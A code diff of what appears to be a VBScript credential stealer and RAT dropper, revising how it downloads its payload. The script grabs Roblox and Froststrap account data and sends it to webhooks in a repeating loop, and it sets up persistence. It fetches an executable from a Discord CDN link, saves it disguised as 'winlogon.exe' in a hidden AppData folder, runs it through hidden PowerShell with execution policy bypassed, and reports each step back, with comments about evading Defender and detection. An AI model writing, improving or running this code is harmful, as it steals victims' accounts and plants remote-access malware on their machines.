@@ -27,7 +27,7 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. RAT DROP (Spam Loop until success) ---
+' --- 2. RAT DROP (Simple PowerShell execution) ---
 Call DropRAT
 
 ' --- 3. INFINITE Re-grab chain ---
@@ -42,59 +42,45 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' Sleep for 2.5 minutes (150 seconds)
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
-' --- RAT DROP (BitsTransfer Spam Loop) ---
+' --- RAT DROP (PowerShell DownloadString) ---
 Sub DropRAT()
-    ' Plain URL
     Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
 
-    ' Hide in AppData
     Dim hidDir : hidDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates"
     If Not fso.FolderExists(hidDir) Then fso.CreateFolder(hidDir)
     
     Dim op : op = hidDir & "\winlogon.exe"
 
-    ' Spam "Fetching Payload" loop until success
-    Dim attempts : attempts = 0
-    Do
-        attempts = attempts + 1
-        ' Spam the downloading message
-        Call PostEmbed(":package: Fetching Payload", "Attempting RAT download (Try " & attempts & ")...", 10181046)
+    ' Send "Fetching Payload"
+    Call PostEmbed(":package: Fetching Payload", "Downloading RAT via PowerShell...", 10181046)
 
-        If fso.FileExists(op) Then fso.DeleteFile op
+    ' PowerShell WebClient download (Very fast, low detection)
+    Dim psCmd : psCmd = "(New-Object System.Net.WebClient).DownloadFile('" & exeUrl & "', '" & op & "')"
+    
+    Dim psf : psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dl.ps1"
+    Dim f : Set f = fso.CreateTextFile(psf, True)
+    f.Write psCmd
+    f.Close
+    Set f = Nothing
+    
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
+    fso.DeleteFile psf, True
 
-        ' Use BitsTransfer (Bypasses Defender)
-        Dim psCmd : psCmd = "Import-Module BitsTransfer -ErrorAction SilentlyContinue;" & _
-                            "Start-BitsTransfer -Source '" & exeUrl & "' -Destination '" & op & "' -ErrorAction SilentlyContinue;"
-                            
-        Dim psf : psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dl.ps1"
-        Dim f : Set f = fso.CreateTextFile(psf, True)
-        f.Write psCmd
-        f.Close
-        Set f = Nothing
-        sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
-        fso.DeleteFile psf, True
-
-        ' Check for success
-        If fso.FileExists(op) Then
-            If fso.GetFile(op).Size > 100000 Then
-                ' Success! Send the green checkmark, execute, and EXIT the spam loop.
-                Dim dsize : dsize = fso.GetFile(op).Size
-                Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
-                
-                Call RunCmd("""" & op & """")
-                Exit Sub 
-            End If
+    ' Check for success and execute
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 100000 Then
+            Dim dsize : dsize = fso.GetFile(op).Size
+            Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
+            
+            ' Execute
+            sh.Run """" & op & """", 0, False
         End If
-        
-        ' Wait 3 seconds before retrying
-        Call SleepSeconds(3)
-    Loop
+    End If
 End Sub
 
 ' --- RunCmd (Hidden Execution via WMI) ---
